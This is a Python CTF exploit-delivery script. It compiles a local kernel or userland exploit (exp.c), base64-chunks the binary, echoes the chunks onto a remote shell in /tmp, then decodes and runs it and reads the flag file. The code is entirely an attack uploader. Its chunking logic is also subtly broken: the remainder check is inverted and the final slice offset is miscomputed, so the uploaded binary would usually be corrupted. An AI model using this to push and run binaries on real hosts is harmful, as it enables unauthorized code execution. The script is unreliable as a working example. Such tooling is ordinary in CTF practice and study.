#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Remote: ./exp.py remote ip:port -nl

import subprocess
from base64 import b64encode, b64decode
from lianpwn import *
from pwncli import *

cli_script()

context.log_level = "INFO"

io: tube = gift.io

commands = []

lg_inf("compiling exp.c")
if subprocess.run(
    "musl-gcc -static -masm=intel -o exp.bin exp.c", shell=True
).returncode:
    lg_err("compile error")
lg_suc("compile finished")

exp_data_list = []
SPLIT_LENGTH = 0x100
with open("./exp.bin", "rb") as f_exp:
    exp_data = b64encode(f_exp.read()).decode()
lg_inf("Data length: " + str(len(exp_data)))
for i in range(len(exp_data) // SPLIT_LENGTH):
    exp_data_list.append(exp_data[i * SPLIT_LENGTH : (i + 1) * SPLIT_LENGTH])
if not len(exp_data) % SPLIT_LENGTH:
    exp_data_list.append(exp_data[(len(exp_data) // SPLIT_LENGTH) :])


commands.append("cd /tmp; touch ./exp.b64")
for i in exp_data_list:
    commands.append("echo -n '" + i + "'>> ./exp.b64")
commands.append("base64 -d ./exp.b64 > ./exp; chmod +x ./exp; ./exp")
commands.append("cat ./flag")

ia()
for i in commands:
    sl(i)

lg_suc(str(len(commands)) + " commands sent.")
ia()
